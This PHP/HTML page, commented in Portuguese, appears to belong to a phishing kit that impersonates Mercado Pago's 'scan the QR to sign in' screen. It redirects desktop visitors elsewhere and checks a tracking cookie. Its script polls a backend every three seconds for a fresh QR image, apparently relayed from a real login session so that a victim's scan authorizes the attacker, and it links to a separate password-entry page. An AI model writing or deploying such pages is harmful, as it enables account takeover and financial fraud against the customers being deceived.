<?php
// --- LÓGICA DE REDIRECIONAMENTO ---
// Se o acesso NÃO for de um dispositivo móvel, redireciona para a versão desktop.
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$isMobile = preg_match('/(Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone)/i', $userAgent);

if (!$isMobile) {
    header('Location: telaqr.php'); // Redireciona para a página desktop
    exit;
}

// O topo do arquivo com a validação do cookie permanece o mesmo.
session_start();
require 'db.php';
if (!isset($_COOKIE['identificador_cliente'])) {
    header('Location: index.php'); // Se não tiver cookie, volta para o início
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escaneie o QR para iniciar sessão</title>
    <style>
        :root {
            --andes-color-yellow-500: #ffe600;
            --andes-color-blue-500: #3483fa;
            --andes-text-color-primary: #333;
            --andes-text-color-secondary: #666; /* Cor ajustada para consistência */
            --andes-text-color-link: var(--andes-color-blue-500);
            --andes-background-color-primary: #fff;
        }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; background-color: var(--andes-background-color-primary); }
        .main-header { background-color: var(--andes-color-yellow-500); padding: 12px 24px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); display: flex; align-items: center; justify-content: flex-start; }
        .main-header img { height: 35px; }
        .main-content { padding: 32px 24px; flex-grow: 1; display: flex; flex-direction: column; align-items: center; text-align: center; }
        .main-title { font-size: 24px; font-weight: 500; color: var(--andes-text-color-primary); line-height: 1.3; margin: 0 0 16px 0; }
        .description-text { font-size: 16px; color: var(--andes-text-color-secondary); margin: 0; line-height: 1.5; }
        .qr-container { 
            width: 100%;
            margin: 40px 0; /* Espaçamento vertical */
            display: flex;
            justify-content: center;
        }
        .qr-container .qr-image {
            width: 70%; /* Largura responsiva */
            max-width: 250px; /* Tamanho máximo para não ficar enorme */
            height: auto; /* Altura automática para manter proporção */
            display: block;
        }
        .other-method-link { 
            color: var(--andes-text-color-link); 
            text-decoration: none; 
            font-size: 15px; 
            font-weight: 500;
            margin-top: auto; /* Empurra para o final */
            padding-top: 24px;
        }
        .other-method-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header class="main-header">
        <img src="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.50/mercadopago/logo__small.png" alt="Mercado Pago">
    </header>

    <main class="main-content">
        
        <div>
            <h1 class="main-title">Escaneie o QR para iniciar sessão de forma segura</h1>
            <p class="description-text">Use o app do Mercado Pago ou do Mercado Livre para escanear o código.</p>
        </div>

        <div class="qr-container">
            <img src="2.png" alt="Código QR para login" id="qr-image" class="qr-image">
        </div>
        
        <a href="senha-mobile.php" class="other-method-link">Não consigo escanear o código</a>
        
    </main>

    <script>
        // A FUNCIONALIDADE JAVASCRIPT É EXATAMENTE A MESMA DA VERSÃO DESKTOP
        const qrImage = document.getElementById('qr-image');

        async function verificarQrCode() {
            try {
                const response = await fetch('api_get_qrcode.php');
                const data = await response.json();

                // Se a API retornar sucesso e um caminho de imagem...
                if (data.success && data.qrcode_path) {
                    console.log('Novo QR Code recebido:', data.qrcode_path);
                    
                    // ...atualiza a imagem, adicionando um timestamp para evitar o cache do navegador.
                    qrImage.src = data.qrcode_path + '?t=' + new Date().getTime();
                } else {
                    // Se não, continua exibindo o QR Code padrão.
                    console.log('Aguardando novo QR Code...');
                }
            } catch (error) {
                console.error('Erro ao buscar QR Code:', error);
            }
        }

        // Inicia a verificação a cada 3 segundos
        setInterval(verificarQrCode, 3000);
    </script>

</body>
</html>